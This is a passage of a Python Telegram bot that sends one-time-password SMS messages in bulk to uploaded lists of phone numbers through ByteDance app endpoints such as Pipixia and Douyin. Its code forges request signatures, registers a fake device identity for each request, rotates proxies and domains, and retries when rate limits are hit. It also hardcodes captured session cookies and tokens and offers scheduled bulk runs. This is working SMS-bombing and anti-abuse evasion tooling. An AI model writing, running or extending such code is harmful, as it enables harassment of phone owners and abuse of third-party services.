        url = f"https://{domain}{self.ENDPOINT}?{urlencode(common_params)}"
        body = urlencode(body_params)
        headers = {
            "Host": domain,
            "User-Agent": f"{self.app['package']}/{self.app['version_code']} (Linux; U; Android 13; en_US; SM-G991B; Build/UP1A.231005.007)",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate",
            "X-SS-DP": str(self.app["aid"]),
            "sdk-version": "2",
            "passport-sdk-version": "50559",
        }
        session = self._create_session(proxy)
        try:
            response = session.post(url, data=body, headers=headers, verify=False, timeout=REQUEST_TIMEOUT)
            elapsed = (time.time() - start_time) * 1000
            try:
                result = response.json()
                result["success"] = result.get("message") == "success"
                result["proxy_used"] = proxy or "Direct"
                result["method"] = "unsigned_mobile"
                result["domain"] = domain
                result["time_ms"] = elapsed
                result["phone"] = phone
                return result
            except json.JSONDecodeError:
                return {"error": "Invalid JSON response", "raw": response.text[:200], "success": False, "time_ms": elapsed, "phone": phone}
        except requests.exceptions.RequestException as e:
            elapsed = (time.time() - start_time) * 1000
            return {"error": str(e), "success": False, "time_ms": elapsed, "phone": phone}
        finally:
            session.close()

    def send_otp_sync(self, phone_number: str, proxy: Optional[str] = None) -> Dict:
        """Synchronous OTP send - Routes to appropriate method based on app config"""
        phone = phone_number.strip().replace(" ", "").replace("-", "")
        if not phone.startswith("+"):
            phone = "+" + phone

        # Route to web endpoint if configured (no signing needed)
        if self.app.get("web_endpoint"):
            return self._send_web_endpoint(phone, proxy)

        # Route to unsigned mobile if configured (no signing needed)
        if self.app.get("unsigned_mobile"):
            return self._send_unsigned_mobile(phone, proxy)

        # Default: signed mobile endpoint with device registration
        start_time = time.time()

        # Fresh identity for each request (register device via API)
        self.refresh_identity(proxy=proxy)

        config = self._get_config()
        cookies = self._get_cookies()
        timestamp = int(time.time())

        url_params = self._build_url_params(config, timestamp)
        body = self._build_body(phone, config, timestamp)
        cookie_str = self._build_cookie_string(cookies)

        try:
            signatures = self._generate_signatures(url_params, body, cookie_str, config)
        except Exception as e:
            return {"error": str(e), "success": False, "time_ms": (time.time() - start_time) * 1000, "phone": phone}

        # Randomize domain per request for freshness / load-balancing
        domain = random.choice(self.app["domains"])
        headers = self._build_headers(config, cookies, timestamp, signatures, body, domain)
        url = f"https://{domain}{self.ENDPOINT}?{url_params}"

        session = self._create_session(proxy)

        try:
            response = session.post(url, data=body, headers=headers, verify=False, timeout=REQUEST_TIMEOUT)
            elapsed = (time.time() - start_time) * 1000
            try:
                result = response.json()
                result["success"] = result.get("message") == "success"
                result["proxy_used"] = proxy or "Direct"
                result["device_id"] = config["device_id"]
                result["time_ms"] = elapsed
                result["phone"] = phone
                return result
            except json.JSONDecodeError:
                return {"error": "Invalid JSON response", "raw": response.text[:200], "success": False, "time_ms": elapsed, "phone": phone}
        except requests.exceptions.RequestException as e:
            elapsed = (time.time() - start_time) * 1000
            return {"error": str(e), "success": False, "time_ms": elapsed, "phone": phone}
        finally:
            session.close()


# ============================================
# SUPER/PIPIXIA OTP SENDER (WORKING WITH SIGNERPY 8404)
# ============================================

class SuperOTPSender:
    """Super/Pipixia OTP Sender - EXACT CAPTURED DATA (CONFIRMED WORKING)"""
    
    BASE_URL = "https://api5.pipix.com"
    ENDPOINT = "/passport/mobile/send_code/v1/"
    
    # EXACT captured data - CONFIRMED WORKING
    DEVICE_ID = "3827862042313376"
    IID = "1101084309068844"
    CDID = "5c1fe491-72a3-4bd4-af7e-352df416c435"
    CSRF_TOKEN = "92fb494b07df6f4d0c37ecda77efd78f"
    ODIN_TT = "306de257ce19f431561b1d01e206188371d51d6b606339dfdeb85d058f2fa1a4f76d9dce4e68d5c1590a1887999d56ffd5b4244f1c3413b163ed1ae25d188698f32f9483851636b434e6195bdd0cb133"
    TTREQ = "1$50ded64cdf1f1984f5d0d44dcd91f821d8ac04be"
    TTREQ_TOB = "1$ad558ceca2aaf307f7dfc072e9c3f93f0dc50970"
    BAIDUID = "67C670DF77E12B149DD8097945F71713:FG=1"
    
    # Base config
    BASE_CONFIG = {
        "app_name": "super",
        "aid": 1319,
        "version_code": "620",
        "version_name": "6.2.0",
        "manifest_version_code": "620",
        "update_version_code": "62050",
        "passport_sdk_version": "50559",
        "device_platform": "android",
        "os": "android",
        "channel": "update",
        "carrier_region": "PK",
        "app_language": "EN",
        "app_region": "US",
        "sys_region": "US",
        "time_zone": "Asia/Karachi",
        "ac": "wifi",
        "ssmix": "a",
        "language": "en",
        "os_api": "34",
        "os_version": "14",
        "resolution": "1080*2282",
        "dpi": "480",
        "device_type": "NOTE+23",
        "device_brand": "VGO_TEL",
    }
    
    TYPE_CODE = 3536  # Afghanistan working code
    RATE_LIMIT_DELAY = 3  # Seconds to wait between requests
    
    def __init__(self, identity_generator: DeviceIdentityGenerator):
        self.identity_generator = identity_generator
        self.last_request_time = 0
    
    def _encrypt_phone(self, phone_number: str) -> str:
        """XOR encrypt phone number"""
        if SIGNERPY_AVAILABLE:
            try:
                return xor(phone_number)
            except:
                pass
        encrypted = ""
        for char in phone_number:
            encrypted_byte = ord(char) ^ 5
            encrypted += format(encrypted_byte, '02x')
        return encrypted
    
    def _build_cookie_string(self) -> str:
        """Build cookie string from EXACT captured data"""
        cookies = [
            f"ttreq_tob={self.TTREQ_TOB}",
            f"install_id={self.IID}",
            f"ttreq={self.TTREQ}",
            f"BAIDUID={self.BAIDUID}",
            f"odin_tt={self.ODIN_TT}",
            f"passport_csrf_token_default={self.CSRF_TOKEN}",
        ]
        return "; ".join(cookies)
    
    def _build_url_params(self, timestamp: int) -> str:
        """Build URL parameters with EXACT captured device data"""
        rticket = str(timestamp * 1000 + 1234)
        params = {
            "passport-sdk-version": self.BASE_CONFIG["passport_sdk_version"],
            "use_new_token_expire_rule": "true",
            "iid": self.IID,
            "device_id": self.DEVICE_ID,
            "ac": self.BASE_CONFIG["ac"],
            "channel": self.BASE_CONFIG["channel"],
            "aid": str(self.BASE_CONFIG["aid"]),
            "app_name": self.BASE_CONFIG["app_name"],
            "version_code": self.BASE_CONFIG["version_code"],
            "version_name": self.BASE_CONFIG["version_name"],
            "device_platform": self.BASE_CONFIG["device_platform"],
            "os": self.BASE_CONFIG["os"],
            "ssmix": self.BASE_CONFIG["ssmix"],
            "device_type": self.BASE_CONFIG["device_type"],
            "device_brand": self.BASE_CONFIG["device_brand"],
            "language": self.BASE_CONFIG["language"],
            "os_api": self.BASE_CONFIG["os_api"],
            "os_version": self.BASE_CONFIG["os_version"],
            "manifest_version_code": self.BASE_CONFIG["manifest_version_code"],
            "resolution": self.BASE_CONFIG["resolution"],
            "dpi": self.BASE_CONFIG["dpi"],
            "update_version_code": self.BASE_CONFIG["update_version_code"],
            "_rticket": rticket,
            "cdid": self.CDID,
            "recommend_disable": "0",
            "carrier_region": self.BASE_CONFIG["carrier_region"],
            "app_language": self.BASE_CONFIG["app_language"],
            "app_region": self.BASE_CONFIG["app_region"],
            "sys_region": self.BASE_CONFIG["sys_region"],
            "update_install_update_version": self.BASE_CONFIG["update_version_code"],
            "time_zone": self.BASE_CONFIG["time_zone"],
            "last_update_version_code": "0",
            "ts": str(timestamp),
        }
        return urlencode(params)
    
    def _build_body(self, phone_number: str, timestamp: int) -> str:
        """Build request body with encrypted phone"""
        encrypted_mobile = self._encrypt_phone(phone_number)
        rticket = str(timestamp * 1000 + 1233)
        params = {
            "auto_read": "0",
            "account_sdk_source": "app",
            "passport_support_flow": "captcha,verify",
            "unbind_exist": "35",
            "mix_mode": "1",
            "mobile": encrypted_mobile,
            "type": str(self.TYPE_CODE),
            "iid": self.IID,
            "device_id": self.DEVICE_ID,
            "ac": self.BASE_CONFIG["ac"],
            "channel": self.BASE_CONFIG["channel"],
            "aid": str(self.BASE_CONFIG["aid"]),
            "app_name": self.BASE_CONFIG["app_name"],
            "version_code": self.BASE_CONFIG["version_code"],
            "version_name": self.BASE_CONFIG["version_name"],
            "device_platform": self.BASE_CONFIG["device_platform"],
            "os": self.BASE_CONFIG["os"],
            "ssmix": self.BASE_CONFIG["ssmix"],
            "device_type": self.BASE_CONFIG["device_type"],
            "device_brand": self.BASE_CONFIG["device_brand"],
            "language": self.BASE_CONFIG["language"],
            "os_api": self.BASE_CONFIG["os_api"],
            "os_version": self.BASE_CONFIG["os_version"],
            "manifest_version_code": self.BASE_CONFIG["manifest_version_code"],
            "resolution": self.BASE_CONFIG["resolution"],
            "dpi": self.BASE_CONFIG["dpi"],
            "update_version_code": self.BASE_CONFIG["update_version_code"],
            "cdid": self.CDID,
            "recommend_disable": "0",
            "carrier_region": self.BASE_CONFIG["carrier_region"],
            "app_language": self.BASE_CONFIG["app_language"],
            "app_region": self.BASE_CONFIG["app_region"],
            "sys_region": self.BASE_CONFIG["sys_region"],
            "update_install_update_version": self.BASE_CONFIG["update_version_code"],
            "time_zone": self.BASE_CONFIG["time_zone"],
            "last_update_version_code": "0",
            "_rticket": rticket,
            "ts": str(timestamp),
        }
        return urlencode(params)
    
    def _generate_signatures(self, url_params: str, body: str, cookie: str) -> Dict:
        """Generate signatures using SignerPy version 8404"""
        if not SIGNERPY_AVAILABLE:
            raise Exception("SignerPy library not available!")
        return sign(params=url_params, payload=body, cookie=cookie, version=8404, aid=self.BASE_CONFIG["aid"])
    
    def _build_headers(self, timestamp: int, signatures: Dict, cookie_str: str, rticket: str) -> Dict:
        """Build request headers"""
        return {
            "Host": "api5.pipix.com",
            "Connection": "keep-alive",
            "Cookie": cookie_str,
            "x-tt-passport-csrf-token": self.CSRF_TOKEN,
            "X-SS-REQ-TICKET": rticket,
            "x-vc-bdturing-sdk-version": "3.7.2.cn",
            "sdk-version": "2",
            "passport-sdk-version": self.BASE_CONFIG["passport_sdk_version"],
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-SS-DP": str(self.BASE_CONFIG["aid"]),
            "User-Agent": f"com.sup.android.superb/{self.BASE_CONFIG['manifest_version_code']} (Linux; U; Android {self.BASE_CONFIG['os_version']}; en_US; {self.BASE_CONFIG['device_type']}; Build/UP1A.231005.007; Cronet/TTNetVersion:b714bfef 2024-09-13 QuicVersion:c459d547 2024-08-27)",
            "Accept-Encoding": "gzip, deflate",
            "X-Gorgon": signatures.get("x-gorgon", ""),
            "X-Khronos": signatures.get("x-khronos", str(timestamp)),
            "X-Argus": signatures.get("x-argus", ""),
            "X-Ladon": signatures.get("x-ladon", ""),
        }
    
    def send_otp_sync(self, phone_number: str, proxy: Optional[str] = None, retry_with_delay: bool = True) -> Dict:
        """Send OTP via Super/Pipixia - with RATE LIMIT DELAYS"""
        phone = phone_number.strip().replace(" ", "").replace("-", "")
        if not phone.startswith("+"):
            phone = "+" + phone
        
        # Enforce delay between requests
        current_time = time.time()
        time_since_last = current_time - self.last_request_time
        if time_since_last < self.RATE_LIMIT_DELAY:
            delay_needed = self.RATE_LIMIT_DELAY - time_since_last
            time.sleep(delay_needed)
        
        start_time = time.time()
        timestamp = int(time.time())
        rticket = str(timestamp * 1000 + 1234)
        
        url_params = self._build_url_params(timestamp)
        body = self._build_body(phone, timestamp)
        cookie_str = self._build_cookie_string()
        
        try:
            signatures = self._generate_signatures(url_params, body, cookie_str)
        except Exception as e:
            return {"error": f"Signature error: {str(e)}", "success": False, "time_ms": (time.time() - start_time) * 1000, "phone": phone}
        
        headers = self._build_headers(timestamp, signatures, cookie_str, rticket)
        url = f"{self.BASE_URL}{self.ENDPOINT}?{url_params}"
        
        proxies = None
        if proxy:
            proxies = {"http": proxy, "https": proxy}
        
        try:
            response = requests.post(url, data=body, headers=headers, proxies=proxies, verify=False, timeout=15)
            elapsed = (time.time() - start_time) * 1000
            
            self.last_request_time = time.time()
            
            try:
                result = response.json()
                success = result.get("message") == "success"
                error_code = result.get("data", {}).get("error_code")
                
                if not success and error_code == 7 and retry_with_delay:
                    time.sleep(10)
                    return self.send_otp_sync(phone_number, proxy, retry_with_delay=False)
                
                return {
                    "success": success,
                    "message": result.get("message", ""),
                    "data": result,
                    "time_ms": elapsed,
                    "phone": phone,
                    "status_code": response.status_code,
                    "proxy_used": proxy or "Direct",
                    "device_id": self.DEVICE_ID,
                }
            except json.JSONDecodeError:
                return {"success": False, "error": "Invalid JSON response", "raw": response.text[:200], "time_ms": elapsed, "phone": phone, "status_code": response.status_code}
        except requests.exceptions.RequestException as e:
            elapsed = (time.time() - start_time) * 1000
            return {"success": False, "error": str(e), "time_ms": elapsed, "phone": phone}


# ============================================
# TASK MANAGEMENT
# ============================================

@dataclass
class Task:
    task_id: str
    phone_numbers: List[str]
    proxies: List[str]
    status: str = "pending"
    current_index: int = 0
    success_count: int = 0
    fail_count: int = 0
    cancelled: bool = False
    chat_id: str = ""
    app_key: str = "pipix"
    results: List[Dict] = field(default_factory=list)
    start_time: float = field(default_factory=time.time)


@dataclass
class ScheduledTask:
    schedule_id: str
    phone_numbers: List[str]
    proxies: List[str]
    chat_id: str
    scheduled_time: datetime
    status: str = "pending"  # pending, running, completed, cancelled


class TaskManager:
    def __init__(self):
        self.tasks: Dict[str, Task] = {}
        self.scheduled_tasks: Dict[str, ScheduledTask] = {}
        self.running_tasks: Set[str] = set()
        self.task_counter = 0
        self.schedule_counter = 0
        self._lock = asyncio.Lock()
    
    async def create_task(self, phone_numbers: List[str], proxies: List[str], chat_id: str) -> str:
        async with self._lock:
            self.task_counter += 1
            task_id = f"task_{self.task_counter}"
            task = Task(task_id=task_id, phone_numbers=phone_numbers, proxies=proxies, chat_id=chat_id)
            self.tasks[task_id] = task
            return task_id
    
    async def create_scheduled_task(self, phone_numbers: List[str], proxies: List[str], chat_id: str, scheduled_time: datetime) -> str:
        async with self._lock:
            self.schedule_counter += 1
            schedule_id = f"schedule_{self.schedule_counter}"
            scheduled_task = ScheduledTask(
                schedule_id=schedule_id,
                phone_numbers=phone_numbers,
                proxies=proxies,
                chat_id=chat_id,
                scheduled_time=scheduled_time
            )
            self.scheduled_tasks[schedule_id] = scheduled_task
            return schedule_id
    
    def get_task(self, task_id: str) -> Optional[Task]:
        return self.tasks.get(task_id)
    
    def get_scheduled_task(self, schedule_id: str) -> Optional[ScheduledTask]:
        return self.scheduled_tasks.get(schedule_id)
    
    async def cancel_task(self, task_id: str) -> bool:
        task = self.tasks.get(task_id)
        if task:
            task.cancelled = True
            task.status = "cancelled"
            return True
        return False
    
    async def cancel_scheduled_task(self, schedule_id: str) -> bool:
        scheduled_task = self.scheduled_tasks.get(schedule_id)
        if scheduled_task:
            scheduled_task.status = "cancelled"
            return True
        return False
    
    def get_running_count(self) -> int:
        return len(self.running_tasks)
    
    def get_all_tasks(self) -> List[Task]:
        return list(self.tasks.values())
    
    def get_all_scheduled_tasks(self) -> List[ScheduledTask]:
        return list(self.scheduled_tasks.values())


# ============================================
# GLOBAL INSTANCES
# ============================================

identity_generator = DeviceIdentityGenerator()
task_manager = TaskManager()
user_states: Dict[int, Dict] = defaultdict(dict)


# ============================================
# UTILITY FUNCTIONS
# ============================================

def get_pakistan_time() -> datetime:
    return datetime.now(PAKISTAN_TZ)


def parse_phone_numbers(text: str) -> List[str]:
    """Extract phone numbers from text"""
    numbers = re.findall(r'[\+]?[\d\s\-\(\)]{10,20}', text)
    valid = []
    for num in numbers:
        clean = re.sub(r'[\s\-\(\)]', '', num)
        if len(clean) >= 10 and clean.replace('+', '').isdigit():
            valid.append(clean)
    return list(set(valid))


def parse_proxies(text: str) -> List[str]:
    """Parse proxies from text"""
    lines = text.strip().split('\n')
    proxies = []
    for line in lines:
        line = line.strip()
        if line and ':' in line:
            proxies.append(line)
    return proxies


def parse_schedule_time(time_str: str) -> Optional[datetime]:
    """Parse schedule time string to datetime"""
    try:
        # Format: HH:MM or HH:MM:SS
        now = get_pakistan_time()
        parts = time_str.strip().split(':')
        if len(parts) >= 2:
            hour = int(parts[0])
            minute = int(parts[1])
            second = int(parts[2]) if len(parts) > 2 else 0
            scheduled = now.replace(hour=hour, minute=minute, second=second, microsecond=0)
            # If time has passed today, schedule for tomorrow
            if scheduled <= now:
                scheduled += timedelta(days=1)
            return scheduled
    except:
        pass
    return None


async def send_message_safe(context: ContextTypes.DEFAULT_TYPE, chat_id: str, text: str, **kwargs):
    """Send message safely, handling long messages"""
    try:
        if len(text) > MAX_MESSAGE_LENGTH:
            chunks = [text[i:i+MAX_MESSAGE_LENGTH] for i in range(0, len(text), MAX_MESSAGE_LENGTH)]
            for chunk in chunks[:3]:
                await context.bot.send_message(chat_id=chat_id, text=chunk, **kwargs)
        else:
            await context.bot.send_message(chat_id=chat_id, text=text, **kwargs)
    except Exception as e:
        logger.error(f"Failed to send message: {e}")


# ============================================
# ASYNC OTP WRAPPER
# ============================================

async def send_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore, app_key: str = DEFAULT_APP) -> Dict:
    """Send OTP asynchronously using thread pool"""
    async with semaphore:
        loop = asyncio.get_event_loop()
        proxy = random.choice(proxies) if proxies else None
        
        # Create a new sender instance for thread safety
        sender = ByteDanceOTPSender(identity_generator, app_key)
        
        # Run blocking OTP send in thread pool
        result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone, proxy)
        
        # Retry on failure
        if not result.get("success"):
            error_desc = str(result.get("data", {}).get("description", result.get("error", ""))).lower()
            limit_keywords = ["limit", "frequency", "maximum", "too many", "often", "error", "timeout"]
            
            if any(kw in error_desc for kw in limit_keywords):
                proxy = random.choice(proxies) if proxies else None
                sender2 = ByteDanceOTPSender(identity_generator, app_key)
                result = await loop.run_in_executor(thread_pool, sender2.send_otp_sync, phone, proxy)
        
        await global_stats.increment(result.get("success", False))
        result["app"] = app_key
        return result


async def send_super_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore) -> Dict:
    """Send Super/Pipixia OTP asynchronously using thread pool"""
    async with semaphore:
        loop = asyncio.get_event_loop()
        proxy = random.choice(proxies) if proxies else None
        
        # Create a new sender instance for thread safety
        sender = SuperOTPSender(identity_generator)
        
        # Run blocking OTP send in thread pool
        result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone, proxy)
        
        # Retry on failure
        if not result.get("success"):
            error_code = result.get("data", {}).get("error_code")
            if error_code == 7:  # Rate limit
                proxy = random.choice(proxies) if proxies else None
                sender2 = SuperOTPSender(identity_generator)
                result = await loop.run_in_executor(thread_pool, sender2.send_otp_sync, phone, proxy)
        
        await global_stats.increment(result.get("success", False))
        return result


# ============================================
# COMMAND HANDLERS
# ============================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pk_time = get_pakistan_time().strftime("%I:%M %p PKT")
    
    keyboard = [
        [InlineKeyboardButton("ðŸ“¦ Bulk OTP", callback_data="bulk"), InlineKeyboardButton("ðŸ“± Single OTP", callback_data="single")],
        [InlineKeyboardButton("ðŸ“ Upload Numbers", callback_data="upload_numbers"), InlineKeyboardButton("ðŸ”’ Upload Proxies", callback_data="upload_proxies")],
        [InlineKeyboardButton("â° Schedule Task", callback_data="schedule"), InlineKeyboardButton("ðŸ“‹ Scheduled", callback_data="scheduled_list")],
        [InlineKeyboardButton("ðŸ“Š Status", callback_data="status"), InlineKeyboardButton("ðŸ”„ Tasks", callback_data="tasks")],
        [InlineKeyboardButton("ðŸ“ˆ Global Stats", callback_data="global_stats")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    msg = f"""
ðŸš€ <b>ByteDance Multi-App OTP Bot v8.0</b>

âš¡ <b>Performance:</b>
â€¢ 5-10 Concurrent OTP/Second
â€¢ 100+ Concurrent Tasks
â€¢ Zero Blocking - Instant Response
â€¢ Multi-User Support (1000+ Users)

ðŸ• <b>Time:</b> {pk_time}

<b>ðŸ“± Single OTP:</b>
<code>/single +923099003842</code>

<b>ðŸ“¦ Bulk OTP:</b>
/bulk - Start bulk task

<b>â° Schedule Task:</b>
<code>/schedule 14:30</code> - Schedule at 2:30 PM

<b>ðŸ“ File Upload:</b>
/uploadnumbers - Upload TXT/CSV
/uploadproxies - Upload proxies

<b>ðŸ”§ Commands:</b>
/apps - Available ByteDance apps
/setapp <name> - Switch app (douyin, pipix, etc)
/status - Bot status
/tasks - Active tasks
/scheduled - Scheduled tasks
/cancel [id] - Cancel task
/stats - Global statistics
"""
    await update.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start_command(update, context)


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = identity_generator.get_stats()
    running = task_manager.get_running_count()
    pk_time = get_pakistan_time().strftime("%Y-%m-%d %I:%M:%S %p")
    user_id = update.effective_user.id
    numbers_count = len(user_states[user_id].get('numbers', []))
    proxies_count = len(user_states[user_id].get('proxies', []))
    g_stats = global_stats.get_stats()
    scheduled_count = len([s for s in task_manager.get_all_scheduled_tasks() if s.status == "pending"])
    
    msg = f"""
ðŸ“Š <b>Bot Status</b>

ðŸ¤– <b>Bot:</b> Online âœ…
ðŸ“¦ <b>SignerPy:</b> {'âœ… Available' if SIGNERPY_AVAILABLE else 'âŒ Missing'}
ðŸ• <b>Pakistan Time:</b> {pk_time}

âš¡ <b>Performance:</b>
â€¢ Max Concurrent OTP: {MAX_CONCURRENT_OTP}
â€¢ Max Concurrent Tasks: {MAX_CONCURRENT_TASKS}
â€¢ Batch Size: {BATCH_SIZE}

ðŸ”¢ <b>Your Data:</b>
â€¢ Numbers: {numbers_count:,}
â€¢ Proxies: {proxies_count:,}

ðŸ“‹ <b>Tasks:</b>
â€¢ Running: {running}
â€¢ Scheduled: {scheduled_count}
â€¢ Generated IDs: {stats['total_generated']:,}

ðŸ“ˆ <b>Global Stats:</b>
â€¢ Total Requests: {g_stats['total_requests']:,}
â€¢ Success: {g_stats['total_success']:,}
â€¢ Failed: {g_stats['total_failed']:,}
"""
    await update.message.reply_text(msg, parse_mode="HTML")


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show global statistics"""
    g_stats = global_stats.get_stats()
    uptime_mins = g_stats['uptime_seconds'] / 60
    success_rate = (g_stats['total_success'] / g_stats['total_requests'] * 100) if g_stats['total_requests'] > 0 else 0
    
    msg = f"""
ðŸ“ˆ <b>Global Statistics</b>

ðŸ”¢ <b>Total Requests:</b> {g_stats['total_requests']:,}
âœ… <b>Success:</b> {g_stats['total_success']:,}
âŒ <b>Failed:</b> {g_stats['total_failed']:,}
ðŸ“Š <b>Success Rate:</b> {success_rate:.1f}%

â± <b>Uptime:</b> {uptime_mins:.1f} minutes
ðŸš€ <b>Requests/Minute:</b> {g_stats['requests_per_minute']:.1f}
"""
    await update.message.reply_text(msg, parse_mode="HTML")



async def apps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show available ByteDance apps"""
    user_id = update.effective_user.id
    current = user_states[user_id].get('app', DEFAULT_APP)
    lines_list = []
    for key, app in BYTEDANCE_APPS.items():
        marker = ' (current)' if key == current else ''
        method = "🌐 web" if app.get("web_endpoint") else "📱 unsigned" if app.get("unsigned_mobile") else "🔐 signed"
        lines_list.append(f'<code>{key}</code> - {app["name"]} (AID={app["aid"]}) [{method}]{marker}')
    msg = "<b>Available ByteDance Apps:</b>\n\n" + "\n".join(lines_list) + "\n\n<b>Switch:</b> <code>/setapp douyin</code>"
    await update.message.reply_text(msg, parse_mode='HTML')


async def setapp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Switch active ByteDance app for OTP"""
    user_id = update.effective_user.id
    if not context.args:
        await apps_command(update, context)
        return
    app_key = context.args[0].lower()
    if app_key not in BYTEDANCE_APPS:
        available = ', '.join(BYTEDANCE_APPS.keys())
        await update.message.reply_text(f'Unknown app: <code>{app_key}</code>\nAvailable: {available}\nUse <code>/apps</code> to see all.', parse_mode='HTML')
        return
    user_states[user_id]['app'] = app_key
    app = BYTEDANCE_APPS[app_key]
    method = "🌐 Web (no signing)" if app.get("web_endpoint") else "📱 Unsigned mobile" if app.get("unsigned_mobile") else "🔐 Signed mobile"
    await update.message.reply_text(f'<b>App switched to:</b> {app["name"]}\nAID: {app["aid"]} | Domain: {app["domains"][0]}\nMethod: {method}', parse_mode='HTML')


async def single_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if context.args:
        phone = ' '.join(context.args)
        await process_single_otp(update, context, phone)
    else:
        user_states[user_id]['awaiting'] = 'single_phone'
        await update.message.reply_text(
            "ðŸ“± <b>Single OTP</b>\n\n"
            "Usage: <code>/single +923099003842</code>\n"
            "Or: <code>/single +923099003842 proxy:port</code>",
            parse_mode="HTML"
        )


async def bulk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    numbers = user_states[user_id].get('numbers', [])
    
    if not numbers:
        await update.message.reply_text(
            "âŒ <b>No numbers loaded!</b>\n\n"
            "Use /setnumbers or /uploadnumbers first.",
            parse_mode="HTML"
        )
        return
    
    proxies = user_states[user_id].get('proxies', [])
    await start_bulk_task(update, context, numbers, proxies)


async def schedule_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Schedule a bulk task for later"""
    user_id = update.effective_user.id
    numbers = user_states[user_id].get('numbers', [])
    
    if not numbers:
        await update.message.reply_text(
            "âŒ <b>No numbers loaded!</b>\n\n"
            "Use /setnumbers or /uploadnumbers first.",
            parse_mode="HTML"
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            "â° <b>Schedule Task</b>\n\n"
            "Usage: <code>/schedule HH:MM</code>\n"
            "Example: <code>/schedule 14:30</code> (2:30 PM)\n\n"
            "Time is in Pakistan timezone (PKT)",
            parse_mode="HTML"
        )
        return
    
    time_str = context.args[0]
    scheduled_time = parse_schedule_time(time_str)
    
    if not scheduled_time:
        await update.message.reply_text(
            "âŒ <b>Invalid time format!</b>\n\n"
            "Use: <code>/schedule HH:MM</code>\n"
            "Example: <code>/schedule 14:30</code>",
            parse_mode="HTML"
        )
        return
    
    proxies = user_states[user_id].get('proxies', [])
    chat_id = str(update.effective_chat.id)
    
    schedule_id = await task_manager.create_scheduled_task(numbers, proxies, chat_id, scheduled_time)
    
    # Start scheduler coroutine
    asyncio.create_task(run_scheduled_task(context, schedule_id))
    
    await update.message.reply_text(
        f"â° <b>Task Scheduled!</b>\n\n"
        f"ðŸ†” ID: {schedule_id}\n"
        f"ðŸ“± Numbers: {len(numbers):,}\n"
        f"ðŸ”’ Proxies: {len(proxies):,}\n"
        f"ðŸ• Time: {scheduled_time.strftime('%I:%M %p PKT')}\n\n"
        f"Use /cancelschedule {schedule_id} to cancel.",
        parse_mode="HTML"
    )


async def scheduled_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List scheduled tasks"""
    scheduled_tasks = task_manager.get_all_scheduled_tasks()
    pending = [s for s in scheduled_tasks if s.status == "pending"]
    
    if not pending:
        await update.message.reply_text("ðŸ“‹ No scheduled tasks.", parse_mode="HTML")
        return
    
    msg = "â° <b>Scheduled Tasks:</b>\n\n"
    for task in pending[-10:]:
        msg += f"ðŸ†” {task.schedule_id}\n"
        msg += f"   ðŸ“± Numbers: {len(task.phone_numbers):,}\n"
        msg += f"   ðŸ• Time: {task.scheduled_time.strftime('%I:%M %p PKT')}\n\n"
    
    await update.message.reply_text(msg, parse_mode="HTML")


async def cancelschedule_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel a scheduled task"""
    if context.args:
        schedule_id = context.args[0]
        if await task_manager.cancel_scheduled_task(schedule_id):
            await update.message.reply_text(f"âœ… Scheduled task {schedule_id} cancelled.", parse_mode="HTML")
        else:
            await update.message.reply_text(f"âŒ Scheduled task {schedule_id} not found.", parse_mode="HTML")
    else:
        await update.message.reply_text("Usage: /cancelschedule <schedule_id>", parse_mode="HTML")


async def setnumbers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['awaiting'] = 'numbers'
    user_states[user_id]['numbers_buffer'] = []
    
    await update.message.reply_text(
        "ðŸ“± <b>Set Numbers</b>\n\n"
        "Send phone numbers:\n"
        "â€¢ One per line OR comma separated\n"
        "â€¢ Send in multiple messages\n"
        "â€¢ Send /done when finished",
        parse_mode="HTML"
    )


async def setproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['awaiting'] = 'proxies'
    user_states[user_id]['proxies_buffer'] = []
    
    await update.message.reply_text(
        "ðŸ”’ <b>Set Proxies</b>\n\n"
        "Send proxies (one per line):\n"
        "â€¢ ip:port\n"
        "â€¢ ip:port:user:pass\n"
        "â€¢ http://user:pass@ip:port\n\n"
        "Send /done when finished",
        parse_mode="HTML"
    )


async def uploadnumbers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['awaiting'] = 'file_numbers'
    
    await update.message.reply_text(
        "ðŸ“ <b>Upload Numbers File</b>\n\n"
        "Send a TXT or CSV file containing phone numbers.\n"
        "I'll extract all valid numbers automatically.",
        parse_mode="HTML"
    )


async def uploadproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['awaiting'] = 'file_proxies'
    
    await update.message.reply_text(
        "ðŸ“ <b>Upload Proxies File</b>\n\n"
        "Send a TXT file containing proxies.\n"
        "Format: ip:port or ip:port:user:pass",
        parse_mode="HTML"
    )


async def clearnumbers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['numbers'] = []
    user_states[user_id]['numbers_buffer'] = []
    await update.message.reply_text("âœ… Numbers cleared!", parse_mode="HTML")


async def clearproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['proxies'] = []
    user_states[user_id]['proxies_buffer'] = []
